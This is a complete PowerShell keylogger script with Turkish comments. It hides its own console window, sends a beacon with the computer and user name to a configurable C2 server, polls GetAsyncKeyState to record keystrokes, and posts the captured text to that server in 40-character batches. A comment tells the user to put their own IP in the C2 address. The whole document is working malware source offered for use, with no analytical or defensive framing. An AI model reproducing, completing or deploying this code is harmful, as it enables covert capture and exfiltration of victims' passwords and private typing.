# Konsol penceresini tamamen gizle
$window = Add-Type -memberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(int hWnd, int nCmdShow);
"@ -name "Win32ShowWindowAsync" -namespace Win32Functions -passThru
$window::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)

# C2 Sunucu Adresin (BUNU KENDI IP'N ILE DEGISTIR KESINLIKLE)
$C2_SERVER = "http://192.168.1.10:8080/upload"

# 1. ADIM: "Ben Hayattayım" Sinyali (Beacon)
$startup_msg = "[+] SİSTEM AKTİF! Bilgisayar: $env:COMPUTERNAME | Kullanıcı: $env:USERNAME"
try {
    Invoke-RestMethod -Uri $C2_SERVER -Method Post -Body @{ log = $startup_msg } -ErrorAction SilentlyContinue
} catch {}

$global:KeyLog = ""

# API Hook ve Tuş Yakalama
$Signature = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
"@
$API = Add-Type -MemberDefinition $Signature -Name 'Keylogger' -Namespace 'Muzoovy' -PassThru
Add-Type -AssemblyName System.Windows.Forms

# Sonsuz Dinleme Döngüsü
while ($true) {
    Start-Sleep -Milliseconds 40
    for ($ascii = 8; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)

        if (($state -band 0x8000) -eq 0x8000) {
            $key = [System.Windows.Forms.Keys]$ascii

            if (($ascii -ge 65 -and $ascii -le 90) -or ($ascii -ge 48 -and $ascii -le 57) -or $ascii -eq 32) {
                if ($ascii -eq 32) { $global:KeyLog += " " }
                else { $global:KeyLog += $key.ToString() }
            }
            elseif ($ascii -eq 13) {
                $global:KeyLog += "[ENTER]`n"
            }
        }
    }

    # RAM'deki log 40 karaktere ulaştıysa C2'ye fırlat
    if ($global:KeyLog.Length -ge 40) {
        try {
            Invoke-RestMethod -Uri $C2_SERVER -Method Post -Body @{ log = $global:KeyLog } -ErrorAction Stop
            $global:KeyLog = ""
        } catch {
            $global:KeyLog = ""
        }
    }
}
